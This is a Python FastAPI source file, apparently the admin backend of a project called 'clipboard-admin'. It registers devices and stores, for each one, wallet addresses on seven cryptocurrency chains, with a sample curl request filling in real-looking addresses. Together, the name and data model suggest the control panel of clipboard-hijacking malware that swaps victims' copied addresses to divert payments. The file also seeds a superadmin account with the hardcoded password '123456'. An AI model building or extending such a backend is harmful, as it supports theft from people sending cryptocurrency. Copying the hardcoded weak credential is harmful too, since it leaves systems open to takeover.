from contextlib import asynccontextmanager

import bcrypt
from dotenv import load_dotenv
from fastadmin import fastapi_app as admin_app
from fastapi import FastAPI
from pydantic import BaseModel, Field

import app.admin
from app.db import close_db, init_db
from app.models import ROLE_SUPERADMIN, Device, User
from app.ulits import generated_totp_secret

load_dotenv()


async def init_admin() -> None:
    exists = await User.filter(username="admin").exists()
    if exists:
        # print("admin 用户已存在！")
        return
    # 生成bcrypt哈希密码
    raw_pwd = "123456"
    hash_pw = bcrypt.hashpw(raw_pwd.encode(), bcrypt.gensalt()).decode()

    user = await User.create(
        username="admin",
        hash_password=hash_pw,
        role=ROLE_SUPERADMIN,
        is_active=True,
    )
    # print(f"✅ 创建超管成功，id={user.id}, username={user.username}")
    # print(f"密码：{raw_pwd}")


@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    await init_admin()
    yield  # 应用运行期间，数据库连接保持可用
    await close_db()


app = FastAPI(lifespan=lifespan)
app.mount("/admin", admin_app)


class DevicveInfo(BaseModel):
    user_id: int
    device_name: str
    is_active: bool
    evm: str
    bitcoin: str
    tron: str
    solana: str
    litecoin: str
    dogecoin: str
    sui: str


@app.post("/devicve_info")
async def devicve(devicve_info: DevicveInfo):
    device = await Device.get_or_none(device_name=devicve_info.device_name)
    if not device is None:
        device.is_active = devicve_info.is_active
        await device.save()
        return {"id": device.id, "device_name": device.device_name}

    user = await User.get_or_none(id=devicve_info.user_id)
    if user is None:
        return {"error": "user is None."}

    device = await Device.create(
        user=user,  # 外键，传 User 实例或 user_id
        device_name=devicve_info.device_name,
        is_active=devicve_info.is_active,
        evm=devicve_info.evm,
        bitcoin=devicve_info.bitcoin,
        tron=devicve_info.tron,
        solana=devicve_info.solana,
        litecoin=devicve_info.litecoin,
        dogecoin=devicve_info.dogecoin,
        sui=devicve_info.sui,
    )
    return {"id": device.id, "device_name": device.device_name}


"""
curl -X POST http://127.0.0.1:8000/devicve_info \
  -H "Content-Type: application/json" \
  -d '{
    "device_name": "123123",
    "user_id":2,
    "is_active":false,
    "evm": "0x51A0Aec8Da3F44D3Ee58987dF9D12B5e890fF66e",
    "bitcoin": "1NUErwEwnRj7cuLa2vqBieAydX9p8vhtmx",
    "tron": "TAAgNnMh54Pw4J1b35K92uKYKtAKnoTa3Q",
    "solana": "2pub42dWqyZ9DkZNGuUcooRFBbhpyx8WNZCaez1CZup1",
    "litecoin": "LM6qscHnwyjVDv2ggcBRJDJ4tg9tYwvgDX",
    "dogecoin": "DBLwjqpVKAoV8rGEWyjgCk3PUyyM84kqYe",
    "sui": "0xd3074a49d1ad17188482213bf3a093ae1851161662be52643732e8f7e5df8b59"
  }'
"""


def main():
    print("Hello from clipboard-admin!")


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "main:app",
        host="127.0.0.1",
        port=8000,
        # access_log=False,  # benchmark 不需要 access log
        # log_level="warning",
        reload=True,
    )
